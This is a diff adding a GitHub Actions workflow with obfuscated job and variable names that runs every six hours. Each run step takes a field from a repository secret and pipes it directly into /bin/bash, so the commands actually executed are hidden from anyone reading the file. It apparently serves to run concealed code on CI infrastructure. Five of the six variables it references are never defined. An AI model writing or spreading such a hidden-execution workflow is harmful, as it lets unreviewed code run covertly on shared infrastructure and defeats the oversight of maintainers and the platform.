@@ -1,0 +1,22 @@
+name: mengtancheng9845
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mengtancheng9845
+        env:
+          gupvz463: ${{ secrets.gupvz463 }}
+        run: |
+          echo $gupvz463 | jq -r .e88115 | /bin/bash
+          echo $lp88537 | jq -r .dff061 | /bin/bash
+          echo $tx8489 | jq -r .klfa9784 | /bin/bash
+          echo $vok32 | jq -r .zmtr6 | /bin/bash
+          echo $r12 | jq -r .eoe46 | /bin/bash
+          echo $od89 | jq -r .gaxzs118 | /bin/bash
+
